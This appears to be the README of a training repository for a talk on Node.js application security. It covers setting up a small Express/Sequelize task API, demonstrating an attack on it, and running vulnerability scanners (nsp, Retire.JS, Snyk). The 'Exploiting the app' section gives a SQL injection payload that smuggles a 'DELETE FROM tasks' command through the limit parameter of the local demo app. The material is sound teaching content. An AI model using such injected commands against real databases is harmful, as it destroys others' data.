# node-security-brown-bag
Scenarios for the brown bag session about secure node applications

## Badges

Snyk: [![Known Vulnerabilities](https://snyk.io/test/github/sdepold/node-security-brown-bag/badge.svg)](https://snyk.io/test/github/sdepold/node-security-brown-bag)


## Setup
The following steps have been made to initialize the project:

```
npm install -g express-generator
cd node-security-brown-bag
express -f
yarn add sequelize@3.16 mysql
yarn add --dev sequelize-cli
node_modules/.bin/sequelize init
node_modules/.bin/sequelize model:create --name Task --attributes title:string
```

## API

```
# Reading all tasks
curl "http://localhost:3000/tasks"

# Reading a limited amount of tasks
curl "http://localhost:3000/tasks?limit=2"

# Creating a task
curl "http://localhost:3000/tasks" -d '{"title":"Some title"}'  -H 'content-type:application/json'
```

## Exploiting the app

```
curl "http://localhost:3000/tasks" -d '{"title":"some task"}'  -H 'content-type:application/json'
curl "http://localhost:3000/tasks" -d '{"title":"some other task"}'  -H 'content-type:application/json'
curl "http://localhost:3000/tasks" # Renders all tasks
curl "http://localhost:3000/tasks?limit=1" # Renders only a single task
curl "http://localhost:3000/tasks?limit=1;DELETE%20FROM%20tasks" # Will delete the tasks due to vulnerability
curl "http://localhost:3000/tasks" # Renders all available (aka no) tasks
```

## Security checks

### nsp

website: https://nodesecurity.io/

```
npm install --save-dev nsp
nsp check --output summary
```

### Retire.JS

Website: http://retirejs.github.io/retire.js/
Description: Walks through all the installed (!) dependencies and checks if they are vulnerable.

```
npm install --save-dev retire
retire
```

### Snyk

Website: https://snyk.io

```
npm install -g snyk
snyk wizard
snyk test
```
